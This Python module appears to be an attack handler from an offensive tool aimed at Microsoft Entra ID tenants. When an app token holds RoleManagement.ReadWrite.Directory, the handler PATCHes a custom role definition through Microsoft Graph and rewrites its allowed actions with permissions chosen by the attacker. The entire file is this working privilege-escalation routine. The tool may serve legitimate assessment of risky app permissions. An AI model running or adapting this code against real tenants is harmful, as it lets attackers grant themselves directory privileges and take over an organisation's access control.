from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.rolemanagemantCustom')


class RolemanagemantCustom_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "RoleManagement.ReadWrite.Directory" in request.roles:
            status = False
            attack_name = "RoleManagementRWCustomVectors"
            message = ""
            error = "RoleManagementRWCustomVectors - failed"
            conf = request.attack_config['roleManagement']
            logger.debug("RoleManagement.ReadWrite.Directory - Allows the app to read and manage the role-based access control (RBAC) settings for your company's directory, without a signed-in user.")
        
            logger.debug("Attack vector - update a custom role.")         
            try:
                if conf["roleUpdateId"]:
                    create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/" + conf["roleUpdateId"]

                    message_obj = {
                        "rolePermissions": [{
                            "allowedResourceActions": conf["permissions"]
                        }]
                    }

                    result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                    if result.status_code == 204:
                        message += "Updated permissions of role %s \n" % (conf["roleUpdateId"])
                        status = True
                    if message == "":
                        message = error
            except:
                logger.error("Unexpected exception in RoleManagement_custom_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))       
            
        return super().handle(request,responses)
